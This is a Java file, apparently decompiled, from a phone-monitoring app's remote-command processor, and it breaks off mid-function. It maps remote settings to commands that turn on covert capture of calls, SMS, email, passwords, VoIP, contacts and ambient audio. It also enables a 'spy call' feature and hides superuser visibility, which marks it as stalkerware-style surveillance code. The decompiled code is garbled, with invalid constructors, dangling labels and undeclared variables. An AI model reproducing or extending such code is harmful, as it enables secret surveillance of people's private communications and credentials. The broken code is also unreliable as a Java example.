package com.vvt.remotecommand.processor.misc;

import com.vvt.base.FeatureId;
import com.vvt.remotecommand.RemoteCommand;
import com.vvt.remotecommand.e;
import com.vvt.remotecommand.exception.FeatureNotSupportedException;
import com.vvt.remotecommand.exception.InvalidCommanFormatException;
import com.vvt.remotecommand.exception.RemoteCommandException;
import com.vvt.remotecommand.processor.RemoteCommandProcessor;
import com.vvt.remotecommand.processor.RemoteCommandProcessor.QueueCategory;
import com.vvt.remotecommand.processor.c;
import com.vvt.remotecontrol.ControlCommand;
import com.vvt.remotecontrol.RemoteControlException;
import com.vvt.remotecontrol.RemoteFunction;
import com.vvt.remotecontrol.b;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode;
import com.vvt.remotecontrol.input.RmtCtrlInputAddressBookMode.Mode;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputCallRecordingAudioSource.AudioSource;
import com.vvt.remotecontrol.input.RmtCtrlInputImAttachmentLimitSize;
import com.vvt.remotecontrol.input.RmtCtrlInputManageCommonData;
import com.vvt.remotecontrol.input.RmtCtrlInputManageCommonData.Operation;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode;
import com.vvt.remotecontrol.input.RmtCtrlInputPanicMode.Mode;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collection;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class p
  extends RemoteCommandProcessor
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public p(com.vvt.remotecontrol.a parama)
  {
    super(parama);
  }
  
  ControlCommand a(FeatureId paramFeatureId, HashMap paramHashMap, int paramInt)
  {
    RmtCtrlInputManageCommonData localRmtCtrlInputManageCommonData = new com/vvt/remotecontrol/input/RmtCtrlInputManageCommonData;
    localRmtCtrlInputManageCommonData.<init>();
    localRmtCtrlInputManageCommonData.setFeatureId(paramFeatureId);
    Object localObject = RmtCtrlInputManageCommonData.Operation.RESET;
    localRmtCtrlInputManageCommonData.setOperation((RmtCtrlInputManageCommonData.Operation)localObject);
    localObject = c(paramHashMap, paramInt);
    localRmtCtrlInputManageCommonData.setList((List)localObject);
    localObject = new com/vvt/remotecontrol/ControlCommand;
    RemoteFunction localRemoteFunction = RemoteFunction.MANAGE_COMMON_DATA;
    ((ControlCommand)localObject).<init>(localRemoteFunction, localRmtCtrlInputManageCommonData);
    return (ControlCommand)localObject;
  }
  
  RmtCtrlInputAddressBookMode a(HashMap paramHashMap)
  {
    int i = 2;
    RmtCtrlInputAddressBookMode localRmtCtrlInputAddressBookMode = new com/vvt/remotecontrol/input/RmtCtrlInputAddressBookMode;
    localRmtCtrlInputAddressBookMode.<init>();
    int j = -1;
    int k = 55;
    Object localObject = Integer.valueOf(k);
    localObject = (String)paramHashMap.get(localObject);
    if (localObject != null) {}
    for (;;)
    {
      try
      {
        localObject = ((String)localObject).trim();
        k = Integer.parseInt((String)localObject);
      }
      catch (NumberFormatException localNumberFormatException)
      {
        RmtCtrlInputAddressBookMode.Mode localMode;
        k = j;
        continue;
        InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        localInvalidCommanFormatException.<init>();
        throw localInvalidCommanFormatException;
      }
      if ((k >= 0) && (k <= i))
      {
        if (k == 0)
        {
          localMode = RmtCtrlInputAddressBookMode.Mode.OFF;
          localRmtCtrlInputAddressBookMode.setMode(localMode);
        }
        j = 1;
        if (k == j)
        {
          localMode = RmtCtrlInputAddressBookMode.Mode.MONITOR;
          localRmtCtrlInputAddressBookMode.setMode(localMode);
        }
        if (k == i)
        {
          localObject = RmtCtrlInputAddressBookMode.Mode.RESTRICTED;
          localRmtCtrlInputAddressBookMode.setMode((RmtCtrlInputAddressBookMode.Mode)localObject);
        }
        return localRmtCtrlInputAddressBookMode;
      }
      k = j;
    }
  }
  
  ArrayList a(FeatureId paramFeatureId, HashMap paramHashMap)
  {
    int i = 67;
    int j = 60;
    int k = 45;
    int m = 0;
    Object localObject1 = null;
    int i1 = 1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject2 = q.a;
    int i4 = paramFeatureId.ordinal();
    int i7 = localObject2[i4];
    Object localObject3;
    boolean bool1;
    int i2;
    Object localObject4;
    Object localObject5;
    Object localObject6;
    label1385:
    label1410:
    int i10;
    switch (i7)
    {
    default: 
    case 1: 
    case 2: 
    case 3: 
    case 4: 
    case 5: 
    case 6: 
    case 7: 
    case 8: 
    case 9: 
    case 10: 
    case 11: 
    case 12: 
    case 13: 
    case 14: 
    case 15: 
    case 16: 
    case 17: 
    case 18: 
    case 19: 
    case 20: 
    case 21: 
    case 22: 
    case 23: 
    case 24: 
    case 25: 
    case 26: 
      for (;;)
      {
        return localArrayList;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.SET_SUPERUSER_VISIBILITY;
        m = 72;
        localObject1 = b(paramHashMap, m);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        continue;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_CAPTURE_CALL;
        bool1 = a(paramHashMap, 2);
        localObject1 = Boolean.valueOf(bool1);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        continue;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject1 = RemoteFunction.ENABLE_CAPTURE_SMS;
        i2 = a(paramHashMap, i1);
        localObject3 = Boolean.valueOf(i2);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject1, localObject3);
        localArrayList.add(localObject2);
        continue;
        localObject2 = f(paramHashMap);
        localArrayList.addAll((Collection)localObject2);
        continue;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_CAPTURE_EMAIL;
        bool1 = a(paramHashMap, 3);
        localObject1 = Boolean.valueOf(bool1);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        continue;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_CAPTURE_MMS;
        bool1 = a(paramHashMap, 5);
        localObject1 = Boolean.valueOf(bool1);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        continue;
        localObject2 = d(paramHashMap);
        localArrayList.addAll((Collection)localObject2);
        localObject2 = e(paramHashMap);
        if (localObject2 != null)
        {
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_IMAGE;
          bool1 = a(paramHashMap, 10);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_AUDIO;
          bool1 = a(paramHashMap, 11);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_VIDEO;
          bool1 = a(paramHashMap, 13);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_APP;
          bool1 = a(paramHashMap, 15);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_URL;
          bool1 = a(paramHashMap, 16);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_CALENDAR;
          bool1 = a(paramHashMap, 17);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_CAPTURE_WALLPAPER;
          bool1 = a(paramHashMap, 9);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_APP_PROFILE;
          bool1 = a(paramHashMap, 57);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_URL_PROFILE;
          bool1 = a(paramHashMap, 58);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_COMMUNICATION_RESTRICTION;
          bool1 = a(paramHashMap, 54);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.SET_MODE_ADDRESS_BOOK;
          localObject1 = a(paramHashMap);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.SET_PANIC_MODE;
          localObject1 = g(paramHashMap);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
          continue;
          i7 = 48;
          localObject2 = a(paramFeatureId, paramHashMap, i7);
          localArrayList.add(localObject2);
          continue;
          i7 = 50;
          localObject2 = a(paramFeatureId, paramHashMap, i7);
          localArrayList.add(localObject2);
          continue;
          i7 = 51;
          localObject2 = a(paramFeatureId, paramHashMap, i7);
          localArrayList.add(localObject2);
          continue;
          i7 = 52;
          localObject2 = a(paramFeatureId, paramHashMap, i7);
          localArrayList.add(localObject2);
          continue;
          i7 = 59;
          localObject2 = a(paramFeatureId, paramHashMap, i7);
          localArrayList.add(localObject2);
          continue;
          i7 = 63;
          localObject2 = a(paramFeatureId, paramHashMap, i7);
          localArrayList.add(localObject2);
          continue;
          localObject2 = new com/vvt/remotecontrol/ControlCommand;
          localObject3 = RemoteFunction.ENABLE_SPY_CALL;
          bool1 = a(paramHashMap, 53);
          localObject1 = Boolean.valueOf(bool1);
          ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
          localArrayList.add(localObject2);
        }
      }
    case 27: 
      i7 = 44;
      localObject2 = Integer.valueOf(i7);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 != null)
      {
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject4 = RemoteFunction.ENABLE_WATCH_NOTIFICATION;
        boolean bool4 = a(paramHashMap, 44);
        localObject5 = Boolean.valueOf(bool4);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject4, localObject5);
        localArrayList.add(localObject2);
      }
      localObject2 = Integer.valueOf(k);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 != null)
      {
        localObject2 = Integer.valueOf(k);
        localObject2 = (String)paramHashMap.get(localObject2);
        a(k, (String)localObject2);
        localObject2 = Integer.valueOf(k);
        localObject2 = (String)paramHashMap.get(localObject2);
        localObject4 = ";";
        localObject6 = ((String)localObject2).split((String)localObject4);
        localObject2 = localObject6[0];
        i7 = Integer.parseInt((String)localObject2);
        if (i7 != i2) {
          break label1684;
        }
        i7 = i2;
        localObject4 = localObject6[i2];
        i4 = Integer.parseInt((String)localObject4);
        if (i4 != i2) {
          break label1693;
        }
        i4 = i2;
        localObject5 = localObject6[2];
        i10 = Integer.parseInt((String)localObject5);
        if (i10 != i2) {
          break label1702;
        }
        i10 = i2;
        label1434:
        i = 3;
        localObject6 = localObject6[i];
        k = Integer.parseInt((String)localObject6);
        if (k != i2) {
          break label1711;
        }
        k = i2;
        label1460:
        if (i7 == 0) {
          break label2553;
        }
        i7 = i2;
      }
      break;
    }
    for (;;)
    {
      if (i4 != 0) {
        i7 |= 0x2;
      }
      if (i10 != 0) {
        i8 |= 0x4;
      }
      if (k != 0) {
        i8 |= 0x8;
      }
      int i3 = a;
      if (i3 != 0) {}
      localObject3 = new com/vvt/remotecontrol/ControlCommand;
      localObject1 = RemoteFunction.SET_WATCH_FLAG;
      localObject2 = Integer.valueOf(i8);
      ((ControlCommand)localObject3).<init>((RemoteFunction)localObject1, localObject2);
      localArrayList.add(localObject3);
      localObject2 = Integer.valueOf(j);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 == null) {
        break;
      }
      localObject2 = Integer.valueOf(j);
      localObject2 = (String)paramHashMap.get(localObject2);
      a(j, (String)localObject2);
      localObject2 = Integer.valueOf(j);
      localObject2 = Arrays.asList(((String)paramHashMap.get(localObject2)).split(";"));
      localObject3 = new com/vvt/remotecontrol/input/RmtCtrlInputManageCommonData;
      ((RmtCtrlInputManageCommonData)localObject3).<init>();
      ((RmtCtrlInputManageCommonData)localObject3).setFeatureId(paramFeatureId);
      localObject1 = RmtCtrlInputManageCommonData.Operation.RESET;
      ((RmtCtrlInputManageCommonData)localObject3).setOperation((RmtCtrlInputManageCommonData.Operation)localObject1);
      ((RmtCtrlInputManageCommonData)localObject3).setList((List)localObject2);
      localObject2 = new com/vvt/remotecontrol/ControlCommand;
      localObject1 = RemoteFunction.MANAGE_COMMON_DATA;
      ((ControlCommand)localObject2).<init>((RemoteFunction)localObject1, localObject3);
      localArrayList.add(localObject2);
      break;
      label1684:
      int i8 = 0;
      localObject2 = null;
      break label1385;
      label1693:
      int i5 = 0;
      localObject4 = null;
      break label1410;
      label1702:
      int i11 = 0;
      localObject5 = null;
      break label1434;
      label1711:
      k = 0;
      localObject6 = null;
      break label1460;
      i8 = 12;
      localObject2 = Integer.valueOf(i8);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 != null)
      {
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_CAPTURE_CALL_RECORD;
        bool1 = a(paramHashMap, 12);
        localObject1 = Boolean.valueOf(bool1);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
      }
      i8 = 70;
      localObject2 = Integer.valueOf(i8);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 == null) {
        break;
      }
      localObject2 = new com/vvt/remotecontrol/ControlCommand;
      localObject3 = RemoteFunction.SET_CALL_RECORDING_AUDIO_SOURCE;
      int n = 70;
      localObject1 = d(paramHashMap, n);
      ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
      localArrayList.add(localObject2);
      break;
      localObject2 = b(paramHashMap);
      localArrayList.addAll((Collection)localObject2);
      break;
      localObject2 = new com/vvt/remotecontrol/ControlCommand;
      localObject3 = RemoteFunction.ENABLE_CAPTURE_PASSWORD;
      boolean bool2 = a(paramHashMap, 22);
      localObject1 = Boolean.valueOf(bool2);
      ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
      localArrayList.add(localObject2);
      break;
      i8 = 68;
      localObject2 = Integer.valueOf(i8);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 != null)
      {
        i5 = 68;
        localObject2 = Integer.valueOf(68);
        localObject2 = (String)paramHashMap.get(localObject2);
        a(i5, (String)localObject2);
        i8 = 68;
        localObject2 = Integer.valueOf(i8);
        localObject2 = Arrays.asList(((String)paramHashMap.get(localObject2)).split(";"));
        localObject4 = new com/vvt/remotecontrol/input/RmtCtrlInputManageCommonData;
        ((RmtCtrlInputManageCommonData)localObject4).<init>();
        ((RmtCtrlInputManageCommonData)localObject4).setFeatureId(paramFeatureId);
        localObject5 = RmtCtrlInputManageCommonData.Operation.RESET;
        ((RmtCtrlInputManageCommonData)localObject4).setOperation((RmtCtrlInputManageCommonData.Operation)localObject5);
        ((RmtCtrlInputManageCommonData)localObject4).setList((List)localObject2);
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject5 = RemoteFunction.MANAGE_COMMON_DATA;
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject5, localObject4);
        localArrayList.add(localObject2);
      }
      localObject2 = Integer.valueOf(i);
      localObject2 = paramHashMap.get(localObject2);
      if (localObject2 == null) {
        break;
      }
      localObject2 = Integer.valueOf(i);
      localObject2 = (String)paramHashMap.get(localObject2);
      a(i, (String)localObject2);
      localObject2 = Integer.valueOf(i);
      localObject2 = (String)paramHashMap.get(localObject2);
      localObject4 = ";";
      localObject6 = ((String)localObject2).split((String)localObject4);
      localObject2 = localObject6[0];
      i8 = Integer.parseInt((String)localObject2);
      if (i8 == i3)
      {
        i8 = i3;
        label2161:
        localObject4 = localObject6[i3];
        i5 = Integer.parseInt((String)localObject4);
        if (i5 != i3) {
          break label2335;
        }
        i5 = i3;
        label2186:
        localObject5 = localObject6[2];
        i11 = Integer.parseInt((String)localObject5);
        if (i11 != i3) {
          break label2344;
        }
        i11 = i3;
        label2210:
        i = 3;
        localObject6 = localObject6[i];
        k = Integer.parseInt((String)localObject6);
        if (k != i3) {
          break label2353;
        }
        k = i3;
        label2236:
        if (i8 == 0) {
          break label2544;
        }
        i8 = i3;
      }
      for (;;)
      {
        if (i5 != 0) {
          i8 |= 0x2;
        }
        if (i11 != 0) {
          i9 |= 0x4;
        }
        if (k != 0) {
          i9 |= 0x8;
        }
        boolean bool3 = a;
        if (bool3) {}
        localObject3 = new com/vvt/remotecontrol/ControlCommand;
        localObject1 = RemoteFunction.SET_CALL_RECORDING_WATCH_FLAG;
        localObject2 = Integer.valueOf(i9);
        ((ControlCommand)localObject3).<init>((RemoteFunction)localObject1, localObject2);
        localArrayList.add(localObject3);
        break;
        i9 = 0;
        localObject2 = null;
        break label2161;
        label2335:
        int i6 = 0;
        localObject4 = null;
        break label2186;
        label2344:
        int i12 = 0;
        localObject5 = null;
        break label2210;
        label2353:
        k = 0;
        localObject6 = null;
        break label2236;
        i9 = 150;
        localObject2 = Integer.valueOf(i9);
        localObject2 = paramHashMap.get(localObject2);
        if (localObject2 == null) {
          break;
        }
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_TEMPORAL_CONTROL_RECORD_AMBIENT;
        bool2 = a(paramHashMap, 150);
        localObject1 = Boolean.valueOf(bool2);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        break;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_CAPTURE_VOIP;
        bool2 = a(paramHashMap, 20);
        localObject1 = Boolean.valueOf(bool2);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        break;
        localObject2 = c(paramHashMap);
        localArrayList.addAll((Collection)localObject2);
        break;
        localObject2 = new com/vvt/remotecontrol/ControlCommand;
        localObject3 = RemoteFunction.ENABLE_CAPTURE_CONTACT;
        bool2 = a(paramHashMap, 6);
        localObject1 = Boolean.valueOf(bool2);
        ((ControlCommand)localObject2).<init>((RemoteFunction)localObject3, localObject1);
        localArrayList.add(localObject2);
        break;
        label2544:
        i9 = 0;
        localObject2 = null;
      }
      label2553:
      int i9 = 0;
      localObject2 = null;
    }
  }
  
  HashMap a(ArrayList paramArrayList)
  {
    HashMap localHashMap = new java/util/HashMap;
    localHashMap.<init>();
    Iterator localIterator = paramArrayList.iterator();
    boolean bool = localIterator.hasNext();
    if (bool)
    {
      Object localObject1 = ((String)localIterator.next()).split(":");
      bool = false;
      label146:
      Object localObject3;
      for (Object localObject2 = null;; localObject3 = (HashMap)localObject3)
      {
        FeatureId localFeatureId;
        try
        {
          localObject2 = localObject1[0];
          int i = Integer.parseInt((String)localObject2);
          localFeatureId = e.a(i);
          bool = localHashMap.containsKey(localFeatureId);
          if (bool) {
            break label146;
          }
          localObject2 = new java/util/HashMap;
          ((HashMap)localObject2).<init>();
          localHashMap.put(localFeatureId, localObject2);
          Integer localInteger = Integer.valueOf(i);
          int j = 1;
          localObject1 = localObject1[j];
          ((HashMap)localObject2).put(localInteger, localObject1);
        }
        catch (NumberFormatException localNumberFormatException)
        {
          bool = b;
        }
        if (!bool) {
          break;
        }
        break;
        localObject3 = localHashMap.get(localFeatureId);
      }
    }
    return localHashMap;
  }
  
  HashSet a(HashMap paramHashMap, List paramList)
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    Object localObject = paramHashMap.keySet();
    Iterator localIterator = ((Set)localObject).iterator();
    for (;;)
    {
      boolean bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = (FeatureId)localIterator.next();
      FeatureId localFeatureId = FeatureId.SPECIAL;
      if (localObject != localFeatureId)
      {
        boolean bool2 = paramList.contains(localObject);
        if (!bool2)
        {
          bool2 = a;
          if (bool2) {}
          localObject = ((HashMap)paramHashMap.get(localObject)).keySet();
          localHashSet.addAll((Collection)localObject);
        }
      }
    }
    return localHashSet;
  }
  
  void a(int paramInt, String paramString)
  {
    int i = 1;
    boolean bool = a;
    if (bool) {}
    switch (paramInt)
    {
    }
    int j;
    do
    {
      return;
      Object localObject = ";";
      String[] arrayOfString = paramString.split((String)localObject);
      j = arrayOfString.length;
      int k = 4;
      if (j != k)
      {
        localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject).<init>();
        throw ((Throwable)localObject);
      }
      for (;;)
      {
        try
        {
          k = arrayOfString.length;
          j = 0;
          localObject = null;
          if (j >= k) {
            break;
          }
          String str = arrayOfString[j];
          int m = Integer.parseInt(str);
          if ((m != 0) && (m != i))
          {
            localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
            ((InvalidCommanFormatException)localObject).<init>();
            throw ((Throwable)localObject);
          }
        }
        catch (NumberFormatException localNumberFormatException)
        {
          localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
          localInvalidCommanFormatException.<init>();
          throw localInvalidCommanFormatException;
        }
        j += 1;
      }
      if (paramString == null) {
        break;
      }
      j = paramString.length();
    } while (j >= i);
    InvalidCommanFormatException localInvalidCommanFormatException = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
    localInvalidCommanFormatException.<init>();
    throw localInvalidCommanFormatException;
  }
  
  public void a(RemoteCommand paramRemoteCommand, c paramc)
  {
    Object localObject1 = paramRemoteCommand.getParameters();
    boolean bool1 = a;
    if (bool1) {}
    int i = ((ArrayList)localObject1).size();
    if (i == 0)
    {
      localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
      ((InvalidCommanFormatException)localObject1).<init>();
      throw ((Throwable)localObject1);
    }
    HashMap localHashMap = a((ArrayList)localObject1);
    boolean bool3 = a;
    if (bool3) {}
    localObject1 = b.a(h());
    boolean bool2 = a;
    if (bool2) {}
    localObject1 = a(localHashMap, (List)localObject1);
    bool2 = a;
    if (bool2) {}
    bool2 = ((HashSet)localObject1).isEmpty();
    Object localObject3;
    if (!bool2)
    {
      localObject3 = new com/vvt/remotecommand/exception/FeatureNotSupportedException;
      localObject4 = new Object[1];
      localObject4[0] = localObject1;
      localObject1 = String.format("The following IDs are not supported %s", (Object[])localObject4);
      ((FeatureNotSupportedException)localObject3).<init>((String)localObject1);
      throw ((Throwable)localObject3);
    }
    bool3 = a;
    if (bool3) {}
    Object localObject4 = new java/util/ArrayList;
    ((ArrayList)localObject4).<init>();
    localObject1 = localHashMap.keySet();
    Iterator localIterator = ((Set)localObject1).iterator();
    for (;;)
    {
      bool3 = localIterator.hasNext();
      if (!bool3) {
        break;
      }
      localObject1 = (FeatureId)localIterator.next();
      try
      {
        localObject3 = localHashMap.get(localObject1);
        localObject3 = (HashMap)localObject3;
        localObject1 = a((FeatureId)localObject1, (HashMap)localObject3);
        if (localObject1 == null) {
          continue;
        }
        bool2 = ((ArrayList)localObject1).isEmpty();
        if (bool2) {
          continue;
        }
        ((ArrayList)localObject4).addAll((Collection)localObject1);
      }
      catch (InvalidCommanFormatException localInvalidCommanFormatException)
      {
        bool3 = b;
      }
      if (!bool3) {}
    }
    bool3 = a;
    if (bool3) {}
    Object localObject2 = h();
    a((com.vvt.remotecontrol.a)localObject2, (ArrayList)localObject4);
    if (paramc != null)
    {
      localObject2 = "";
      paramc.b(paramRemoteCommand, this, (String)localObject2);
    }
  }
  
  void a(com.vvt.remotecontrol.a parama, ArrayList paramArrayList)
  {
    Object localObject1 = paramArrayList.iterator();
    for (;;)
    {
      boolean bool1 = ((Iterator)localObject1).hasNext();
      if (bool1)
      {
        Object localObject2 = (ControlCommand)((Iterator)localObject1).next();
        try
        {
          boolean bool2 = a;
          if (bool2) {}
          localObject2 = parama.execute((ControlCommand)localObject2);
          bool2 = localObject2 instanceof RemoteControlException;
          if (bool2)
          {
            localObject2 = (RemoteControlException)localObject2;
            throw ((Throwable)localObject2);
          }
        }
        catch (RemoteControlException localRemoteControlException)
        {
          boolean bool3 = b;
          if (bool3) {}
          localObject1 = new com/vvt/remotecommand/exception/RemoteCommandException;
          Object[] arrayOfObject = new Object[1];
          String str = localRemoteControlException.toString();
          arrayOfObject[0] = str;
          str = String.format("Failed applying new settings. Err: %s", arrayOfObject);
          ((RemoteCommandException)localObject1).<init>(str);
          throw ((Throwable)localObject1);
        }
      }
    }
  }
  
  boolean a(HashMap paramHashMap, int paramInt)
  {
    int i = 1;
    Object localObject1 = Integer.valueOf(paramInt);
    localObject1 = (String)paramHashMap.get(localObject1);
    int j = -1;
    if (localObject1 != null) {
      localObject1 = ((String)localObject1).trim();
    }
    for (;;)
    {
      try
      {
        k = Integer.parseInt((String)localObject1);
      }
      catch (Exception localException)
      {
        k = j;
        continue;
      }
      if ((k != 0) && (k != i))
      {
        localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject1).<init>();
        throw ((Throwable)localObject1);
      }
      if (k == 0)
      {
        k = 0;
        Object localObject2 = null;
      }
      for (;;)
      {
        return k;
        k = i;
      }
      int k = j;
    }
  }
  
  String b(HashMap paramHashMap, int paramInt)
  {
    Object localObject = Integer.valueOf(paramInt);
    localObject = (String)paramHashMap.get(localObject);
    int i = -1;
    if (localObject != null) {
      localObject = ((String)localObject).trim();
    }
    for (;;)
    {
      try
      {
        j = Integer.parseInt((String)localObject);
      }
      catch (Exception localException)
      {
        j = i;
        continue;
      }
      if (j != 0)
      {
        i = 1;
        if (j != i)
        {
          localObject = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
          ((InvalidCommanFormatException)localObject).<init>();
          throw ((Throwable)localObject);
        }
      }
      return String.valueOf(j);
      int j = i;
    }
  }
  
  ArrayList b(HashMap paramHashMap)
  {
    int i = 42;
    int j = 41;
    RemoteFunction localRemoteFunction = null;
    int k = 1;
    int n = -1;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    Object localObject1 = Integer.valueOf(j);
    boolean bool2 = paramHashMap.containsKey(localObject1);
    Object localObject4;
    Object localObject5;
    if (bool2)
    {
      localObject1 = new com/vvt/remotecontrol/ControlCommand;
      localObject4 = RemoteFunction.ENABLE_EVENT_CAPTURE;
      boolean bool1 = a(paramHashMap, j);
      localObject5 = Boolean.valueOf(bool1);
      ((ControlCommand)localObject1).<init>((RemoteFunction)localObject4, localObject5);
      localArrayList.add(localObject1);
    }
    localObject1 = Integer.valueOf(43);
    bool2 = paramHashMap.containsKey(localObject1);
    int i1;
    if (bool2)
    {
      i1 = 43;
      localObject1 = Integer.valueOf(i1);
      localObject1 = (String)paramHashMap.get(localObject1);
      if (localObject1 == null) {
        break label596;
      }
    }
    for (;;)
    {
      Integer localInteger2;
      try
      {
        localObject1 = ((String)localObject1).trim();
        i1 = Integer.parseInt((String)localObject1);
      }
      catch (NumberFormatException localNumberFormatException1)
      {
        int i4;
        i1 = n;
        continue;
        localObject4 = new com/vvt/remotecontrol/ControlCommand;
        localObject5 = RemoteFunction.SET_EVENT_MAX_NUMBER;
        localInteger2 = Integer.valueOf(i1);
        ((ControlCommand)localObject4).<init>((RemoteFunction)localObject5, localInteger2);
        localArrayList.add(localObject4);
        localObject4 = new com/vvt/remotecontrol/ControlCommand;
        localObject5 = RemoteFunction.ENABLE_EVENT_DELIVERY;
        if (i1 == 0) {
          break label347;
        }
      }
      if (i1 >= k)
      {
        i4 = 500;
        if (i1 <= i4) {}
      }
      else
      {
        localObject1 = new com/vvt/remotecommand/exception/InvalidCommanFormatException;
        ((InvalidCommanFormatException)localObject1).<init>();
        throw ((Throwable)localObject1);
      }
      i1 = k;
      Object localObject2 = Boolean.valueOf(i1);
      ((ControlCommand)localObject4).<init>((RemoteFunction)localObject5, localObject2);
      localArrayList.add(localObject4);
